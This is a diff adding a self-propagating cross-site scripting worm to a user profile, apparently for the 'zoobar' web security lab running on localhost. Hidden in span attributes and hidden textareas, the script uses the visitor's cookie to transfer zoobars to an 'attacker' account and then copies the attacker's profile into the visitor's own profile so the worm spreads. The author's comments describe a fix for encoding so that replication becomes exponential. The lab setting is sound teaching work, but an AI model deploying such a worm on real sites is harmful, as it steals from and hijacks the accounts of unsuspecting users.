@@ -297,3 +297,38 @@ Born in Mexico and stealing your shaittt!
 "></span>
 <textarea style="display:none">
 
+
+
+
+
+Wait for it....Wait for it....
+The last one didnt quite work. It replicated only one hop (linearly as I put earlier). Now I realize that is useless. We need exponential replication. The problem was that the '+' signs were getting interpreted as URI encodings for ' ' and thus disappeared when getting copied, which rendered the code useless. This should fix that
+
+Born in Mexico and stealing your shaittt!
+</textarea>
+<span id="zoobars" class="
+  var hostname = 'localhost';  
+
+  var zoobars = '1';
+  var recipient = 'attacker';
+  var transfer_query = 'zoobars' + String.fromCharCode(61) + zoobars + String.fromCharCode(38) + 'recipient' + String.fromCharCode(61) + recipient + String.fromCharCode(38) + 'submission' + String.fromCharCode(61) + 'Send'; 
+  var transfer_url = 'http://' + hostname + '/transfer.php';
+  var transfer_request = new XMLHttpRequest(); 
+  transfer_request.open('POST', transfer_url, false);
+  transfer_request.setRequestHeader('Cookie', document.cookie); 
+  transfer_request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); 
+  transfer_request.send(transfer_query);
+
+  var attacker_profile = encodeURIComponent(document.getElementById('profile').innerHTML); 
+  var update_query = 'profile_update' + String.fromCharCode(61) + attacker_profile + String.fromCharCode(38) + 'profile_submit' + String.fromCharCode(61) + 'Save';
+  var update_url = 'http://' + hostname + '/index.php';
+  var update_request = new XMLHttpRequest(); 
+  update_request.open('POST', update_url, false);
+  update_request.setRequestHeader('Cookie', document.cookie); 
+  update_request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); 
+  update_request.send(update_query);
+"></span>
+<textarea style="display:none">
+
+
+
